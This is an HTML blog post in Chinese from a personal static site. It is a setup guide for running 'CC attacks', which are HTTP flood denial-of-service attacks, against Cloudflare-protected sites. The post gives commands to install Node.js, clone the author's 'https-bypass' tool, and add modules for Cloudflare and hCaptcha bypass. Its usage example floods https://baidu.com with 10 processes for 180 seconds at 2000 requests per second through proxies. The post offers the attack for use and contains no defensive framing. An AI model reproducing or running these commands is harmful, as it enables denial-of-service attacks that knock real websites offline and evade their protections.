@@ -1,0 +1,229 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>搭建 cc攻击 无验证的cloudlflare站点 | Piokto</title>
+<link rel="shortcut icon" href="https://piokto.github.io/favicon.ico?v=1658978207881">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://piokto.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="搭建 cc攻击 无验证的cloudlflare站点 | Piokto - Atom Feed" href="https://piokto.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="需要到HTTP或SOCKS5代理
+自行解决
+部署nodejs
+使用git安装nvm
+git clone git://github.com/creationix/nvm.git ~/nvm
+下载完成后加入系统环境
+source   ~/.ba..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://piokto.github.io">
+  <img class="avatar" src="https://piokto.github.io/images/avatar.png?v=1658978207881" alt="">
+  </a>
+  <h1 class="site-title">
+    Piokto
+  </h1>
+  <p class="site-description">
+    To Be More Freedom
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/piokto" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+        <a href="https://weibo.com/fadedream1224" target="_blank">
+          <i class="ri-weibo-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              搭建 cc攻击 无验证的cloudlflare站点
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-07-22
+              </span>
+              <span>
+                1 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="需要到http或socks5代理">需要到HTTP或SOCKS5代理</h1>
+<h1 id="自行解决">自行解决</h1>
+<h3 id="部署nodejs">部署nodejs</h3>
+<h4 id="使用git安装nvm">使用git安装nvm</h4>
+<p><code>git clone git://github.com/creationix/nvm.git ~/nvm</code></p>
+<h4 id="下载完成后加入系统环境">下载完成后加入系统环境</h4>
+<p><code>source   ~/.bashrc</code></p>
+<h4 id="nvm安装nodejs">nvm安装nodejs</h4>
+<p><code>nvm install 16.15.0</code></p>
+<h4 id="如需要安装另外的版本">如需要安装另外的版本</h4>
+<p><code>nvm install 版本号</code></p>
+<h4 id="安装">安装</h4>
+<pre><code class="language-shell">git clone https://github.com/piokto/https-bypass.git
+cd https-bypass
+</code></pre>
+<h4 id="安装npm模块">安装npm模块</h4>
+<pre><code class="language-shell">npm i requests
+npm i https-proxy-agent
+npm i crypto-random-string
+npm i events
+npm i fs
+npm i net
+npm i cloudscraper
+npm i request
+npm i hcaptcha-solver
+npm i randomstring
+npm i cluster
+npm i cloudflare-bypasser
+</code></pre>
+<pre><code class="language-shell">example：
+node https-bypass.js GET 10 https://baidu.com 180 2000
+使用GET 运行10个node进程攻击目标180秒 每秒2000次访问
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E9%9C%80%E8%A6%81%E5%88%B0http%E6%88%96socks5%E4%BB%A3%E7%90%86">需要到HTTP或SOCKS5代理</a></li>
+<li><a href="#%E8%87%AA%E8%A1%8C%E8%A7%A3%E5%86%B3">自行解决</a><br>
+*
+<ul>
+<li><a href="#%E9%83%A8%E7%BD%B2nodejs">部署nodejs</a>
+<ul>
+<li><a href="#%E4%BD%BF%E7%94%A8git%E5%AE%89%E8%A3%85nvm">使用git安装nvm</a></li>
+<li><a href="#%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%88%90%E5%90%8E%E5%8A%A0%E5%85%A5%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83">下载完成后加入系统环境</a></li>
+<li><a href="#nvm%E5%AE%89%E8%A3%85nodejs">nvm安装nodejs</a></li>
+<li><a href="#%E5%A6%82%E9%9C%80%E8%A6%81%E5%AE%89%E8%A3%85%E5%8F%A6%E5%A4%96%E7%9A%84%E7%89%88%E6%9C%AC">如需要安装另外的版本</a></li>
+<li><a href="#%E5%AE%89%E8%A3%85">安装</a></li>
+<li><a href="#%E5%AE%89%E8%A3%85npm%E6%A8%A1%E5%9D%97">安装npm模块</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://piokto.github.io/linux-an-zhuang-nodejs/">
+              <h3 class="post-title">
+                Linux安装nodejs 
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://piokto.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
